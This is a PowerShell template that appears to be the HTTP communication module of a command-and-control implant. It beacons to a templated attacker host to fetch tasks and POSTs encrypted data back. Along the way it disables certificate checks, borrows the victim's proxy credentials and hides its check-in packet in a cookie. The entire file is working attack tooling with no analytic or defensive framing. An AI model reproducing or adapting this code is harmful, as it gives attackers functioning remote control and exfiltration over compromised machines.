$Script:index = 0;
$Script:host = "{{ host }}";
if ($host.StartsWith('https')) {
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };
}
$Script:servers = @($Script:host);

$Script:GetTask = {
    try {
        if ($Script:servers[$Script:index].StartsWith("http")) {
            $client = New-Object System.Net.WebClient;
            $client.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
            $client.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
            if ($Script:proxy) {
                $client.Proxy = $Script:proxy;
            }
            $client.Headers.Add("User-Agent", $Script:userAgent);
            $Script:headers.GetEnumerator() | ForEach-Object {
                $client.Headers.Add($_.Name, $_.Value);
            }
            $packet = New-RoutingPacket -EncData $Null -Meta 4;
            $cookie = [Convert]::ToBase64String($packet);
            $client.Headers.Add("Cookie", "{{ session_cookie }}session=$cookie");
            $uri = $Script:taskURIs | Get-Random;
            $result = $client.DownloadData($Script:servers[$Script:index] + $uri);
            $result;
        }
    } catch [Net.WebException] {
        $Script:missedCheckins += 1;
        if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
            Start-Negotiate -S "$Script:host" -SK $SK -UA $ua;
        }
    }
};

$Script:SendMessage = {
    param ($data)
    if ($data) {
        $encryptedData = Encrypt-Bytes $data;
        $packet = New-RoutingPacket -EncData $encryptedData -Meta 5;
        if ($Script:servers[$Script:index].StartsWith('http')) {
            $client = New-Object System.Net.WebClient;
            $client.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
            $client.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
            if ($Script:proxy) {
                $client.Proxy = $Script:proxy;
            }
            $client.Headers.Add('User-Agent', $Script:userAgent);
            $Script:headers.GetEnumerator() | ForEach-Object {
                $client.Headers.Add($_.Name, $_.Value);
            }
            try {
                $uri = $Script:taskURIs | Get-Random;
                $response = $client.UploadData($Script:servers[$Script:index] + $uri, 'POST', $packet);
            } catch [System.Net.WebException] {
                if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
                    Start-Negotiate -S "$Script:host" -SK $SK -UA $ua;
                }
            }
        }
    }
};
